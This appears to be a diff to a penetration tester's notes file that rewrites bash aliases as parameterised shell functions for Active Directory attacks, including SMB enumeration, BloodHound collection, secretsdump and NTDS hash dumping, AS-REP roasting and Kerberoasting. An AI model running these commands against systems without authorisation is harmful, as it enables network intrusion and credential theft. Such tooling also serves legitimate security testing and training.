@@ -33,11 +33,11 @@ date modified: Sunday, June 29th 2025, 12:44:14 am
 
 ```bash
 # 🔎 SMB & NetBIOS
-alias smbshare='smbclient -L \\\\TARGET\\ -N'
-alias smbconnect='smbclient \\\\TARGET\\SHARE'
-alias smbuser='smbclient -L \\\\TARGET\\ -U'
+smbshare() { smbclient -L "\\\\$1\\" -N; } # Usage: smbshare <target>
+smbconnect() { smbclient "\\\\$1\\$2"; } # Usage: smbconnect <target> <share>
+smbuser() { smbclient -L "\\\\$1\\" -U "$2"; } # Usage: smbuser <target> <user>
 alias enum4='enum4linux-ng -a'
-alias enumuser='enum4linux -u USERNAME -p PASSWORD -a TARGET'
+enumuser() { enum4linux -u "$1" -p "$2" -a "$3"; } # Usage: enumuser <username> <password> <target>
 alias crackmap='crackmapexec smb'
 alias smbmap='smbmap -H'
 alias nbtscan='nbtscan -r 10.10.10.0/24'
@@ -46,19 +46,19 @@ alias nbtscan='nbtscan -r 10.10.10.0/24'
 alias kerbrute='python3 ~/tools/kerbrute/kerbrute.py'
 alias ldapenum='ldapsearch -x -H ldap://TARGET -s base'
 alias adenum='python3 ~/tools/ADEnum/ADEnum.py'
-alias bloodhound='bloodhound-python -u USER -p PASSWORD -dc-ip DC_IP -c all'
+bloodhound() { bloodhound-python -u "$1" -p "$2" -dc-ip "$3" -c all; } # Usage: bloodhound <user> <password> <dc_ip>
 
 # 🗂️ Password & Hash Dumping
-alias secretsdump='secretsdump.py DOMAIN/USER:PASSWORD@TARGET'
-alias dumpntds='secretsdump.py -just-dc DOMAIN/USER:PASSWORD@DC_IP'
+secretsdump() { secretsdump.py "$1/$2:$3@$4"; } # Usage: secretsdump <domain> <user> <password> <target>
+dumpntds() { secretsdump.py -just-dc "$1/$2:$3@$4"; } # Usage: dumpntds <domain> <user> <password> <dc_ip>
 alias hashgrab='impacket-secretsdump'
-alias ridbrute='rpcclient -U "" TARGET -N -c "enumdomusers"'
+ridbrute() { rpcclient -U "" "$1" -N -c "enumdomusers"; } # Usage: ridbrute <target>
 
 # 📜 Kerberos Ticket Attacks
-alias asreproast='GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip TARGET'
-alias kerberoast='GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip TARGET -request'
+asreproast() { GetNPUsers.py "$1/" -usersfile "$2" -no-pass -dc-ip "$3"; } # Usage: asreproast <domain> <users.txt> <target>
+kerberoast() { GetUserSPNs.py "$1/$2:$3" -dc-ip "$4" -request; } # Usage: kerberoast <domain> <user> <password> <target>
 alias tgt='klist'
-alias renewtgt='kinit USERNAME@DOMAIN'
+renewtgt() { kinit "$1@$2"; } # Usage: renewtgt <username> <domain>
 alias ptt='export KRB5CCNAME=FILE:/tmp/krb5cc_1337 && export KRB5_CONFIG=~/krb5.conf'
 
 # 🛠️ Tools & Shortcuts
@@ -69,9 +69,9 @@ alias neo4jstart='sudo systemctl start neo4j'
 alias neo4jstop='sudo systemctl stop neo4j'
 
 # 🪓 Attack Chains
-alias kerbcheck='nmap --script "krb5-enum-users" -p 88 TARGET'
-alias noauthrpc='rpcclient -U "" -N TARGET'
-alias authrpc='rpcclient -U USER%PASSWORD TARGET'
+kerbcheck() { nmap --script "krb5-enum-users" -p 88 "$1"; } # Usage: kerbcheck <target>
+noauthrpc() { rpcclient -U "" -N "$1"; } # Usage: noauthrpc <target>
+authrpc() { rpcclient -U "$1%$2" "$3"; } # Usage: authrpc <user> <password> <target>
 
 # 📚 Active Directory Cheatsheets
 alias adhelp='xdg-open https://book.hacktricks.xyz/windows-hardening/active-directory-methodology'
